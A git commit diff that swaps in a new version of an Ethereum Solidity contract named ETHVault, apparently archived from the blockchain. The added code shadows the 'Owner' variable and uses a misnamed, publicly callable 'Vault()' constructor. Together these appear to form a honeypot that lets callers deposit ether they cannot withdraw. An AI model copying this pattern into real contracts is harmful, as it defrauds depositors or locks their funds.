77541664b35a8af76c83b06d6c6d8ee0380400cd
Ngoc Bui Dinh <buidinhngoc.aiti@gmail.com>
2018-10-16 11:01:18 +0700

    add contract ETHVault

--- ETHVault.sol
+++ ETHVault.sol
@@ -1,42 +1,46 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract ETHVault at 0x96050da7c01bbd4891ed766720a5c1c79b824163
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract ETHVault at 0x038e20839aebfe12b7956adcbc2511f6f7085164
 */
-pragma solidity ^0.4.12;
+pragma solidity ^0.4.13;
 
 contract Owned {
-    address public Owner;
-    function Owned() { Owner = msg.sender; }
-    modifier onlyOwner { if( msg.sender == Owner ) _; }
+    address public Owner = msg.sender;
+    modifier onlyOwner { if (msg.sender == Owner) _; }
 }
 
 contract ETHVault is Owned {
     address public Owner;
     mapping (address => uint) public Deposits;
+
+    event Deposit(uint amount);
+    event Withdraw(uint amount);
     
-    function init() payable { Owner = msg.sender; deposit(); }
+    function Vault() payable {
+        Owner = msg.sender;
+        deposit();
+    }
     
-    function() payable { deposit(); }
-    
+    function() payable {
+        revert();
+    }
+
     function deposit() payable {
-        if (!isContract(msg.sender))
-            if (msg.value >= 0.25 ether)
-                if (Deposits[msg.sender] + msg.value >= Deposits[msg.sender])
-                    Deposits[msg.sender] += msg.value;
+        if (msg.value >= 1 ether)
+            if (Deposits[msg.sender] + msg.value >= Deposits[msg.sender]) {
+                Deposits[msg.sender] += msg.value;
+                Deposit(msg.value);
+            }
     }
     
     function withdraw(uint amount) payable onlyOwner {
-        if (Deposits[msg.sender] > 0 && amount <= Deposits[msg.sender])
+        if (Deposits[msg.sender] > 0 && amount <= Deposits[msg.sender]) {
             msg.sender.transfer(amount);
+            Withdraw(amount);
+        }
     }
     
-    function isContract(address addr) payable returns (bool) {
-        uint size;
-        assembly { size := extcodesize(addr) }
-        return size > 0;
-    }
-
     function kill() payable onlyOwner {
-        require(this.balance == 0);
-        selfdestruct(msg.sender);
+        if (this.balance == 0)
+            selfdestruct(msg.sender);
     }
 }
